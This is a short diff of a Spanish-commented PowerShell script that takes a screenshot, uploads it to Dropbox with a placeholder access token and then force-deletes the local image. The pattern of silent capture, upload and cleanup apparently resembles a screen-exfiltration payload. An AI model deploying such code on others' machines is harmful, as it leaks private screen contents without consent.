@@ -33,24 +33,21 @@ function Capture-Screen {
     return $filePath
 }
 
+# Capturar la pantalla y subirla a Dropbox
 try {
-    # Define el token de acceso de Dropbox
-    $db = ""
-
-    # Capturar la pantalla y obtener la ruta del archivo
+    $db = "YOUR_DROPBOX_ACCESS_TOKEN"
     $screenshotPath = Capture-Screen
 
-    # Subir la captura de pantalla a Dropbox
     if (-not ([string]::IsNullOrEmpty($db))) {
         DropBox-Upload -SourceFilePath $screenshotPath -db $db
     } else {
         Write-Error "No se proporcionó el token de acceso de Dropbox."
     }
 
-    # Limpiar el archivo de captura de pantalla
     Remove-Item -Path $screenshotPath -Force
 }
 catch {
     Write-Error "Ocurrió un error: $_"
 }
+
 
